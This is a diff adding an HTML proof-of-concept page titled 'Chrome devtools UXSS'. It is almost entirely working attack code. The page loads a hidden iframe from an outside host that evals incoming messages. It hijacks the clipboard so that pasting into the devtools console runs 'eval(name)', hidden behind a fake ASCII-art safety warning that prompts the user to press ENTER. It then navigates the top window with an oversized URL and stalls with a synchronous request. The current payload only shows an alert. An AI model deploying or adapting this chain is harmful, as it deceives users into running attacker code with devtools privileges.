@@ -1,0 +1,47 @@
+<body>
+  <iframe style="display: none" sandbox="allow-scripts allow-top-navigation" name="ifr" src="https://terjanq.me/xss.php?js=onmessage=e=>eval(e.data)">
+    
+  </iframe>
+  
+  <h1>
+    Chrome devtools UXSS
+  </h1>
+  <p>
+    <ol>
+     <li>
+        Open devtools
+      </li>
+      <li>
+        Press <code>ctrl+v</code> inside console and press <code>enter</code>
+      </li>
+      <li>
+        wait a couple of seconds
+      </li>
+  </ol>
+  </p>
+  <script>
+const warning=`\
+██╗    ██╗ █████╗ ██████╗ ███╗   ██╗██╗███╗   ██╗ ██████╗ 
+██║    ██║██╔══██╗██╔══██╗████╗  ██║██║████╗  ██║██╔════╝ 
+██║ █╗ ██║███████║██████╔╝██╔██╗ ██║██║██╔██╗ ██║██║  ███╗
+██║███╗██║██╔══██║██╔══██╗██║╚██╗██║██║██║╚██╗██║██║   ██║
+╚███╔███╔╝██║  ██║██║  ██║██║ ╚████║██║██║ ╚████║╚██████╔╝
+ ╚══╝╚══╝ ╚═╝  ╚═╝╚═╝  ╚═╝╚═╝  ╚═══╝╚═╝╚═╝  ╚═══╝ ╚═════╝ 
+                                                          `
+
+    document.addEventListener("copy", (event) => {
+      event.clipboardData.setData("text/plain", 'eval(name);`' + '\n'.repeat(100) + warning + '\nYou tried to paste some code which could be malicious. If you understand the risks and want to allow code pasting, please press `ENTER` \n\n\n\n\n\n\n\n\n\n\n\n\n');
+      event.preventDefault();
+    });
+    // ifr.postMessage('setTimeout(()=>top.location="https://gmail.com/", 5000)','*');
+    window.name = "alert(`you have been pwned!`)"
+
+    window.onresize = () => {
+      document.execCommand("copy");
+      ifr.postMessage('setTimeout(()=>top.location="https://google.com/"+"a".repeat(64000), 6000)','*');
+      setTimeout(()=>{
+        xhr = new XMLHttpRequest(); xhr.open("GET", "https://terjanq.me/stall.php?noinstant&timeout=10", false); xhr.send();
+      },1000);
+    }    
+  </script>
+</body>
